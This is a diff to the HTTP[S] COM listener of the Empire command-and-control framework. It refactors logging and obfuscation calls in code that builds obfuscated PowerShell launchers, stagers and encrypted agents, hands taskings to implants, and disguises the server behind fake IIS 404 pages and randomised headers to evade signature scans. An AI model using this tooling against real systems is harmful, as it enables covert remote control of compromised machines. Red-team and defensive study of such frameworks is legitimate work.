@@ -1,8 +1,5 @@
-from __future__ import print_function
-
 import base64
 import copy
-import json
 import logging
 import os
 import random
@@ -10,28 +7,42 @@ import ssl
 import sys
 import time
 from builtins import object, str
-from typing import List
+from typing import List, Optional, Tuple
 
-from flask import Flask, make_response, render_template, request, send_from_directory
-from pydispatch import dispatcher
+from flask import Flask, make_response, request, send_from_directory
 from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, packets, templating
-from empire.server.utils import data_util, listener_util
+from empire.server.common.empire import MainMenu
+from empire.server.core.db.base import SessionLocal
+from empire.server.utils import data_util, listener_util, log_util
+from empire.server.utils.module_util import handle_validate_message
+
+LOG_NAME_PREFIX = __name__
+log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
+    def __init__(self, mainMenu: MainMenu, params=[]):
 
         self.info = {
             "Name": "HTTP[S] COM",
-            "Author": ["@harmj0y"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                }
+            ],
             "Description": (
                 "Starts a http[s] listener (PowerShell only) that uses a GET/POST approach "
                 "using a hidden Internet Explorer COM object. If using HTTPS, valid certificate required."
             ),
             "Category": ("client_server"),
             "Comments": [],
+            "Software": "",
+            "Techniques": [],
+            "Tactics": [],
         }
 
         # any options needed by the stager, settable during runtime
@@ -146,13 +157,17 @@ class Listener(object):
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
 
+        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
+
+        self.instance_log = log
+
     def default_response(self):
         """
         Returns an IIS 7.5 404 not found page.
         """
         return open(f"{self.template_dir }/default.html", "r").read()
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
         """
         Validate all options for this listener.
         """
@@ -162,26 +177,22 @@ class Listener(object):
             for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
         ]
 
-        for key in self.options:
-            if self.options[key]["Required"] and (
-                str(self.options[key]["Value"]).strip() == ""
-            ):
-                print(helpers.color('[!] Option "%s" is required.' % (key)))
-                return False
         # If we've selected an HTTPS listener without specifying CertPath, let us know.
         if (
             self.options["Host"]["Value"].startswith("https")
             and self.options["CertPath"]["Value"] == ""
         ):
-            print(helpers.color("[!] HTTPS selected but no CertPath specified."))
-            return False
-        return True
+            return handle_validate_message(
+                "[!] HTTPS selected but no CertPath specified."
+            )
+
+        return True, None
 
     def generate_launcher(
         self,
         encode=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         userAgent="default",
         proxy="default",
         proxyCreds="default",
@@ -196,22 +207,19 @@ class Listener(object):
         """
         bypasses = [] if bypasses is None else bypasses
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_launcher(): no language specified!"
-                )
-            )
+            log.error("listeners/http_com generate_launcher(): no language specified!")
+            return None
 
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
         if (
-            listenerName
-            and (listenerName in self.threads)
-            and (listenerName in self.mainMenu.listeners.activeListeners)
-        ):
-
+            True
+        ):  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
             # extract the set options for this instantiated listener
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
+            listenerOptions = active_listener.options
+
             host = listenerOptions["Host"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
             staging_key = listenerOptions["StagingKey"]["Value"]
@@ -307,14 +315,13 @@ class Listener(object):
                 stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
-                    stager = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    stager = self.mainMenu.obfuscationv2.obfuscate(
                         stager,
-                        obfuscationCommand=obfuscationCommand,
+                        obfuscation_command=obfuscation_command,
                     )
                 # base64 encode the stager and return it
                 if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
+                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                 ):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
@@ -322,18 +329,9 @@ class Listener(object):
                     return stager
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."
-                    )
+                log.error(
+                    "listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."
                 )
-
-        else:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_launcher(): invalid listener name specification!"
-                )
-            )
 
     def generate_stager(
         self,
@@ -341,7 +339,7 @@ class Listener(object):
         encode=False,
         encrypt=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         language=None,
     ):
         """
@@ -349,11 +347,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_stager(): no language specified!"
-                )
-            )
+            log.error("listeners/http_com generate_stager(): no language specified!")
             return None
 
         profile = listenerOptions["DefaultProfile"]["Value"]
@@ -391,7 +385,7 @@ class Listener(object):
             stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = data_util.keyword_obfuscation(stager)
+            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -419,10 +413,9 @@ class Listener(object):
             unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
-                unobfuscated_stager = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
                     unobfuscated_stager,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
             # base64 encode the stager and return it
             if encode:
@@ -437,10 +430,8 @@ class Listener(object):
                 return unobfuscated_stager
 
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module."
-                )
+            log.error(
+                "listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module."
             )
 
     def generate_agent(
@@ -448,7 +439,7 @@ class Listener(object):
         listenerOptions,
         language=None,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         version="",
     ):
         """
@@ -456,11 +447,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_agent(): no language specified!"
-                )
-            )
+            log.error("listeners/http_com generate_agent(): no language specified!")
             return None
 
         language = language.lower()
@@ -478,7 +465,7 @@ class Listener(object):
             f.close()
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            code = data_util.keyword_obfuscation(code)
+            code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -503,18 +490,15 @@ class Listener(object):
                     "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                 )
             if obfuscate:
-                code = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                code = self.mainMenu.obfuscationv2.obfuscate(
                     code,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
             return code
 
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module."
-                )
+            log.error(
+                "listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module."
             )
 
     def generate_comms(self, listenerOptions, language=None):
@@ -545,23 +529,19 @@ class Listener(object):
                 return comms
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
-                    )
+                log.error(
+                    "listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
                 )
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http_com generate_comms(): no language specified!"
-                )
-            )
+            log.error("listeners/http_com generate_comms(): no language specified!")
 
     def start_server(self, listenerOptions):
         """
         Threaded function that actually starts up the Flask server.
         """
-
+        self.instance_log = log_util.get_listener_logger(
+            LOG_NAME_PREFIX, self.options["Name"]["Value"]
+        )
         # make a copy of the currently set listener options for later stager/agent generation
         listenerOptions = copy.deepcopy(listenerOptions)
 
@@ -575,7 +555,6 @@ class Listener(object):
         port = listenerOptions["Port"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
 
-        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
         app = Flask(__name__, template_folder=self.template_dir)
         self.app = app
 
@@ -606,7 +585,7 @@ class Listener(object):
                         language="powershell",
                         encode=False,
                         obfuscate=obfuscate,
-                        obfuscationCommand=obfuscate_command,
+                        obfuscation_command=obfuscate_command,
                         bypasses=bypasses,
                     )
                     return launcher
@@ -628,13 +607,10 @@ class Listener(object):
             """
             if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(
-                    request.remote_addr
-                )
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/http_com/{}".format(listenerName)
-                )
+                message = f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested resource"
+                self.instance_log.debug(message)
+                log.debug(message)
+
                 return make_response(self.default_response(), 404)
 
         @app.after_request
@@ -693,11 +669,8 @@ class Listener(object):
             clientIP = request.remote_addr
 
             listenerName = self.options["Name"]["Value"]
-            message = "[*] GET request for {}/{} from {}".format(
-                request.host, request_uri, clientIP
-            )
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
+            message = f"{listenerName}: GET request for {request.host}/{request_uri} from {clientIP}"
+            self.instance_log.info(message)
 
             routingPacket = None
             reqHeader = request.headers.get(listenerOptions["RequestHeader"]["Value"])
@@ -730,42 +703,35 @@ class Listener(object):
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 listenerName = self.options["Name"]["Value"]
-                                message = (
-                                    "[*] Sending {} stager (stage 1) to {}".format(
-                                        language, clientIP
+                                message = f"{listenerName}: Sending {language} stager (stage 1) to {clientIP}"
+                                self.instance_log.info(message)
+                                log.info(message)
+
+                                with SessionLocal() as db:
+                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                        db, language
                                     )
-                                )
-                                signal = json.dumps({"print": True, "message": message})
-                                dispatcher.send(
-                                    signal,
-                                    sender="listeners/http_com/{}".format(listenerName),
-                                )
-                                stage = self.generate_stager(
-                                    language=language,
-                                    listenerOptions=listenerOptions,
-                                    obfuscate=self.mainMenu.obfuscate,
-                                    obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                )
+                                    stage = self.generate_stager(
+                                        language=language,
+                                        listenerOptions=listenerOptions,
+                                        obfuscate=False
+                                        if not obf_config
+                                        else obf_config.enabled,
+                                        obfuscation_command=""
+                                        if not obf_config
+                                        else obf_config.command,
+                                    )
                                 return make_response(base64.b64encode(stage), 200)
 
                             elif results.startswith(b"ERROR:"):
                                 listenerName = self.options["Name"]["Value"]
-                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
-                                    request_uri, clientIP, results
-                                )
-                                signal = json.dumps({"print": True, "message": message})
-                                dispatcher.send(
-                                    signal,
-                                    sender="listeners/http_com/{}".format(listenerName),
-                                )
+                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
+                                self.instance_log.error(message)
 
                                 if "not in cache" in results:
                                     # signal the client to restage
-                                    print(
-                                        helpers.color(
-                                            "[*] Orphaned agent from %s, signaling restaging"
-                                            % (clientIP)
-                                        )
+                                    log.info(
+                                        f"Orphaned agent from {clientIP}, signaling restaging"
                                     )
                                     return make_response(self.default_response(), 401)
                                 else:
@@ -774,32 +740,21 @@ class Listener(object):
                             else:
                                 # actual taskings
                                 listenerName = self.options["Name"]["Value"]
-                                message = "[*] Agent from {} retrieved taskings".format(
-                                    clientIP
-                                )
-                                signal = json.dumps(
-                                    {"print": False, "message": message}
-                                )
-                                dispatcher.send(
-                                    signal,
-                                    sender="listeners/http_com/{}".format(listenerName),
-                                )
+                                message = f"Agent from {clientIP} retrieved taskings"
+                                self.instance_log.info(message)
                                 return make_response(base64.b64encode(results), 200)
                         else:
-                            # dispatcher.send("[!] Results are None...", sender='listeners/http_com')
+                            self.instance_log.debug(
+                                f"{listenerName}: Results are None..."
+                            )
                             return make_response(self.default_response(), 404)
                 else:
                     return make_response(self.default_response(), 404)
 
             else:
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] {} requested by {} with no routing packet.".format(
-                    request_uri, clientIP
-                )
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/http_com/{}".format(listenerName)
-                )
+                message = f"{listenerName}: {request_uri} requested by {clientIP} with no routing packet."
+                self.instance_log.error(message)
                 return make_response(self.default_response(), 404)
 
         @app.route("/<path:request_uri>", methods=["POST"])
@@ -834,52 +789,53 @@ class Listener(object):
                             ]
 
                             listenerName = self.options["Name"]["Value"]
-                            message = "[*] Sending agent (stage 2) to {} at {}".format(
-                                sessionID, clientIP
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/http_com/{}".format(listenerName),
-                            )
+                            message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
+                            self.instance_log.info(message)
+                            log.info(message)
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(
-                                language=language,
-                                listenerOptions=listenerOptions,
-                                obfuscate=self.mainMenu.obfuscate,
-                                obfuscationCommand=self.mainMenu.obfuscateCommand,
-                            )
-                            encrypted_agent = encryption.aes_encrypt_then_hmac(
-                                sessionKey, agentCode
-                            )
-                            # TODO: wrap ^ in a routing packet?
+                            with SessionLocal() as db:
+                                obf_config = (
+                                    self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                        db, language
+                                    )
+                                )
+                                agentCode = self.generate_agent(
+                                    language=language,
+                                    listenerOptions=listenerOptions,
+                                    obfuscate=False
+                                    if not obf_config
+                                    else obf_config.enabled,
+                                    obfuscation_command=""
+                                    if not obf_config
+                                    else obf_config.command,
+                                )
 
-                            return make_response(base64.b64encode(encrypted_agent), 200)
+                                if language.lower() in ["python", "ironpython"]:
+                                    sessionKey = bytes.fromhex(sessionKey)
+
+                                encrypted_agent = encryption.aes_encrypt_then_hmac(
+                                    sessionKey, agentCode
+                                )
+                                # TODO: wrap ^ in a routing packet?
+
+                                return make_response(
+                                    base64.b64encode(encrypted_agent), 200
+                                )
 
                         elif results[:10].lower().startswith(b"error") or results[
                             :10
                         ].lower().startswith(b"exception"):
                             listenerName = self.options["Name"]["Value"]
-                            message = (
-                                "[!] Error returned for results by {} : {}".format(
-                                    clientIP, results
-                                )
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/http_com/{}".format(listenerName),
-                            )
+                            message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
+                            self.instance_log.error(message)
                             return make_response(self.default_response(), 200)
                         elif results == b"VALID":
                             listenerName = self.options["Name"]["Value"]
-                            message = "[*] Valid results return by {}".format(clientIP)
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/http_com/{}".format(listenerName),
+                            message = (
+                                f"{listenerName}: Valid results return by {clientIP}"
                             )
+                            self.instance_log.info(message)
                             return make_response(self.default_response(), 200)
                         else:
                             return make_response(base64.b64encode(results), 200)
@@ -920,10 +876,11 @@ class Listener(object):
 
         except Exception as e:
             listenerName = self.options["Name"]["Value"]
-            message = "[!] Listener startup on port {} failed: {}".format(port, e)
-            message += "[!] Ensure the folder specified in CertPath exists and contains your pem and private key file."
-            signal = json.dumps({"print": True, "message": message})
-            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
+            message1 = f"{listenerName}: Listener startup on port {port} failed: {e}"
+            message2 = f"{listenerName}: Ensure the folder specified in CertPath exists and contains your pem and private key file."
+
+            self.instance_log.error(message1, exc_info=True)
+            self.instance_log.error(message2, exc_info=True)
 
     def start(self, name=""):
         """
@@ -954,14 +911,11 @@ class Listener(object):
         Terminates the server thread stored in the self.threads dictionary,
         keyed by the listener name.
         """
-
         if name and name != "":
-            print(helpers.color("[!] Killing listener '%s'" % (name)))
-            self.threads[name].kill()
+            to_kill = name
         else:
-            print(
-                helpers.color(
-                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
-                )
-            )
-            self.threads[self.options["Name"]["Value"]].kill()
+            to_kill = self.options["Name"]["Value"]
+
+        self.instance_log.info(f"{to_kill}: shutting down...")
+        log.info(f"{to_kill}: shutting down...")
+        self.threads[to_kill].kill()
